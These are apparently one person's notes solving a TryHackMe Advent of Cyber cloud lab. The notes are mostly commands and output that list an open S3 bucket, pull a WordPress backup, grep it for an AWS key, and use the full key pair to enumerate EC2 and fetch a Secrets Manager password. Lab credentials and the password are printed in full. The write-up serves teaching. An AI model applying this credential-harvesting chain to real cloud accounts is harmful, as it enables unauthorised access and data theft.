apt install awscli
aws s3 ls s3://images.bestfestivalcompany.com --no-sign-request
2021-11-13 22:06:51       6148 .DS_Store
2021-11-13 19:43:03     108420 0vF39p3.png
2021-11-27 18:55:21     705191 AWSConsole.png
2021-11-13 19:43:03       5652 aws-logo.png
2021-11-13 22:06:51         68 flag.txt
2021-11-13 22:06:51    2349068 flyer.png
2021-11-13 19:43:03      92531 presents.jpg
2021-11-13 19:43:03       4680 tree.png
2021-11-24 06:52:22   16556739 wp-backup.zip

aws s3 cp s3://images.bestfestivalcompany.com/flag.txt . --no-sign-request
download: s3://images.bestfestivalcompany.com/flag.txt to ./flag.txt

cat flag.txt 
It's easy to get your elves data when you leave it so easy to find!


aws s3 cp s3://images.bestfestivalcompany.com/wp-backup.zip . --no-sign-request
download: s3://images.bestfestivalcompany.com/wp-backup.zip to ./wp-backup.zip

unzip wp-backup.zip

cd wp-backup

grep -i "AKIA" *.*
wp-config.php:define('S3_UPLOADS_KEY', 'AKIAQI52OJVCPZXFYAOI');

AKIAQI52OJVCPZXFYAOI


aws configure --profile hr
AWS Access Key ID [None]: AKIAQI52OJVCPZXFYAOI
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]: 



cd ~.aws
cat config                 
[profile hr]
region = us-east-1
                                                                                                   
(base) ┌──(gd㉿lucy)-[~/.aws]
└─$ cat credentials 
[hr]
aws_access_key_id = AKIAQI52OJVCPZXFYAOI
aws_secret_access_key = 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


aws sts get-access-key-info --access-key-id AKIAQI52OJVCPZXFYAOI --profile hr
{
    "Account": "019181489476"
}


#aws ec2 describe-instances --output text --region us-east-1 --profile hr
RESERVATIONS    019181489476    043234062703    r-0e89ba65b28a7c699
INSTANCES       0       x86_64  HR-Po-Insta-1NAKAMW2PPVMT       False   True    xen     ami-0c2b8ca1dad447f8a      i-0c56041ac61cf5a95     t3a.micro       hr-key  2021-11-13T12:36:58.000Z        Linux/UNIX ip-172-31-68-81.ec2.internal    172.31.68.81            /dev/xvda       ebs     True    User initiated (2021-11-13 12:42:39 GMT)   subnet-00b1107c0c18c0722        RunInstances    2021-11-13T12:36:58.000Z   hvm     vpc-0235b5a9591606b73
BLOCKDEVICEMAPPINGS     /dev/xvda
EBS     2021-11-13T12:36:59.000Z        True    attached        vol-0ac79339aac8b249d
CAPACITYRESERVATIONSPECIFICATION        open
CPUOPTIONS      1       2
ENCLAVEOPTIONS  False
HIBERNATIONOPTIONS      False
METADATAOPTIONS enabled disabled        1       optional        applied
MONITORING      disabled
NETWORKINTERFACES               interface       16:35:78:d8:60:d1       eni-027945da0ddb79e59   019181489476       ip-172-31-68-81.ec2.internal    172.31.68.81    True    in-use  subnet-00b1107c0c18c0722   vpc-0235b5a9591606b73
ATTACHMENT      2021-11-13T12:36:58.000Z        eni-attach-0d91e2137f6014220    True    0       0 attached
GROUPS  sg-0c6e7cd87c1c8d035    default
PRIVATEIPADDRESSES      True    ip-172-31-68-81.ec2.internal    172.31.68.81
PLACEMENT       us-east-1f              default
SECURITYGROUPS  sg-0c6e7cd87c1c8d035    default
STATE   80      stopped
STATEREASON     Client.UserInitiatedShutdown    Client.UserInitiatedShutdown: User initiated shutdown
TAGS    aws:cloudformation:stack-id     arn:aws:cloudformation:us-east-1:019181489476:stack/HR-Portal/5ebc4e90-447e-11ec-a711-12d63f44d7b7
TAGS    aws:cloudformation:logical-id   Instance
TAGS    created_by      Elf McHR
TAGS    aws:cloudformation:stack-name   HR-Portal
TAGS    Name    HR-Portal


#aws secretsmanager list-secrets --profile hr
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:019181489476:secret:HR-Password-8AkWYF",
            "Name": "HR-Password",
            "Description": "Portal DB Secret",
            "LastChangedDate": 1637717347.812,
            "LastAccessedDate": 1639699200.0,
            "Tags": [
                {
                    "Key": "aws:cloudformation:stack-name",
                    "Value": "HR-Portal"
                },
                {
                    "Key": "aws:cloudformation:logical-id",
                    "Value": "FalseSecret"
                },
                {
                    "Key": "aws:cloudformation:stack-id",
                    "Value": "arn:aws:cloudformation:us-east-1:019181489476:stack/HR-Portal/5ebc4e90-447e-11ec-a711-12d63f44d7b7"
                },
                {
                    "Key": "created_by",
                    "Value": "Elf McHR"
                },
                {
                    "Key": "Name",
                    "Value": "Payroll"
                }
            ],
            "SecretVersionsToStages": {
                "70630b3c-4fbe-4a24-885d-18445bd808b1": [
                    "AWSCURRENT"
                ],
                "a702190e-69f7-4a8a-81fd-3d20b486657a": [
                    "AWSPREVIOUS"
                ]
            },
            "CreatedDate": 1636807016.521
        }
    ]
}


https://docs.aws.amazon.com/secretsmanager/latest/userguide/tutorials_basic.html

aws secretsmanager get-secret-value --secret-id HR-Password --profile hr
{
    "ARN": "arn:aws:secretsmanager:us-east-1:019181489476:secret:HR-Password-8AkWYF",
    "Name": "HR-Password",
    "VersionId": "70630b3c-4fbe-4a24-885d-18445bd808b1",
    "SecretString": "The Secret you're looking for is not in this **REGION**. Santa wants to have low latency to his databases. Look closer to where he lives.",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1637717347.718
}


Santa live in Eu-north
https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-regions-availability-zones.html


aws secretsmanager get-secret-value --secret-id HR-Password --profile hr --region eu-north-1                                                       255 ⨯
{
    "ARN": "arn:aws:secretsmanager:eu-north-1:019181489476:secret:HR-Password-KIJEvK",
    "Name": "HR-Password",
    "VersionId": "f806c3cd-ea20-4a1a-948f-80927f3ad366",
    "SecretString": "Winter2021!",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1636809979.996
}

https://tryhackme.com/room/adventofcyber3
https://www.youtube.com/watch?v=RAgvdpvKJa0&t=215s